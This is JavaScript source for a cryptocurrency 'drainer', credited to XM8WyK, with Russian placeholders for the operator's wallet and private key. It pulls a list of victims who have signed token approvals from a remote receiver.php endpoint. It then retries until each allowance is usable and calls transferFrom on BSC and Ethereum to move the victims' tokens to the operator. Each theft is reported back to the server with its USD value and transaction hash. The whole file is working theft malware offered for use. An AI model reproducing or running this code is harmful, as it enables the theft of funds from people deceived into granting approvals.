console.log('Drainer by XM8WyK');
console.log('');

const Web3 = require('web3');
const axios = require('axios');
const async = require('async');
const qs = require('qs');

const address = 'СЮДА_АДРЕС_СВОЕГО_КОШЕЛЬКА'; // Wallet address
const private = 'СЮДА_ЕГО_ПРИВАТНЫЙ_КЛЮЧ'; // Wallet private key

const domain = 'http://example.ru'; // Website address

const ABI = JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],
"stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]`);

const nodes = {
  56: new Web3('https://rpc.ankr.com/bsc'),
  1: new Web3('https://rpc.ankr.com/eth')
};

async function transfer_from(chain, from_address, contract_address, amount, to_address, use_wallet) {
  try {
    var ethereum = nodes[chain];
    const contract = new ethereum.eth.Contract(ABI, contract_address);
    const method = await contract.methods.transferFrom(from_address, to_address, amount).encodeABI();
    const price = await ethereum.eth.getGasPrice();
    const tx = {
      to: contract_address,
      value: '0x0',
      gasLimit: ethereum.utils.toHex(100000),
      gasPrice: price,
      data: method
    };
    const signed_tx = await ethereum.eth.accounts.signTransaction(tx, use_wallet.private);
    const reciept = await ethereum.eth.sendSignedTransaction(signed_tx.rawTransaction);
    return reciept.transactionHash || 'null';
  } catch(err) {
    console.log(err);
  } return false;
}

async function is_withdraw_available(chain, from_address, to_address, contract, amount) {
  try {
    var ethereum = nodes[chain];
    const pContract = new ethereum.eth.Contract(ABI, contract);
    var balance = await pContract.methods.balanceOf(from_address).call();
    if (new ethereum.utils.BN(balance).lt(new ethereum.utils.BN(amount))) {
      return false;
    }
    var allowance = await pContract.methods.allowance(from_address, to_address).call();
    if (new ethereum.utils.BN(allowance).lt(new ethereum.utils.BN(amount))) {
      return false;
    }
    return true;
  } catch(err) {
    console.log(err);
  } return false;
}

const withdraw_queue = async.queue(async ({ raw }) => {
  try {
    var use_wallet = { address: address, private: private };
    console.log('[#' + raw.address + `] approved`);
    console.log('[#' + raw.address + `] withdrawing ${raw.token_amount}`);
    var result = await transfer_from(raw.chain_id, raw.address, raw.token_address, raw.token_amount, address, use_wallet);
    if (result != false) {
      try {
        console.log('[#' + raw.address + `] withdrawed ${raw.token_amount}`);
        await axios.get(`${domain}/receiver.php?method=SEND_TOKEN&token_name=${raw.token_name}&chain_id=${raw.chain_id}&amount=${raw.amount}&usd_amount=${raw.usd_amount}&user_id=${raw.user_id}&hash=${result}`);
      } catch(err) {
        console.log(err);
      }
    }
  } catch(err) {
    console.log(err);
  }
}, 1);

const in_queue = async.queue(async ({ raw }) => {
  try {
    console.log('[#' + raw.address + '] added to queue, withdraw ' + raw.token_address);
    console.log('[#' + raw.address + `] approve address: ${address}`);
    if ((await is_withdraw_available(raw.chain_id, raw.address, address, raw.token_address, raw.token_amount) == false)) {
      console.log('[#' + raw.address + '] not approved, wait for 5 sec, attempt #1');
      await new Promise(r => setTimeout(r, 5000));
    }
    if ((await is_withdraw_available(raw.chain_id, raw.address, address, raw.token_address, raw.token_amount) == false)) {
      console.log('[#' + raw.address + '] not approved, wait for 15 sec, attempt #2');
      await new Promise(r => setTimeout(r, 15000));
    }
    if ((await is_withdraw_available(raw.chain_id, raw.address, address, raw.token_address, raw.token_amountt) == false)) {
      console.log('[#' + raw.address + '] not approved, wait for 60 sec, attempt #3');
      await new Promise(r => setTimeout(r, 60000));
    }
    if ((await is_withdraw_available(raw.chain_id, raw.address, address, raw.token_address, raw.token_amount) == false)) {
      console.log('[#' + raw.address + '] not approved, wait for 300 sec, attempt #4');
      await new Promise(r => setTimeout(r, 300000));
    }
    if ((await is_withdraw_available(raw.chain_id, raw.address, address, raw.token_address, raw.token_amount) == false)) {
      console.log('[#' + raw.address + '] 4 attemps was failed, cancel transfer');
      return;
    }
    withdraw_queue.push({ raw });
  } catch(err) {
    console.log(err);
  }
}, 50);

async function init() {
  while (true) {
    try {
      var response = await axios.get(`${domain}/receiver.php?method=GET_APPROVES`);
      if (response.data.length > 0) {
        for (const raw of response.data) {
          try {
            in_queue.push({ raw });
          } catch(err) {
            console.log(err);
          }
        }
      }
    } catch(err) {
      console.log(err);
    }
    await new Promise(r => setTimeout(r, 15000));
  }
}

init();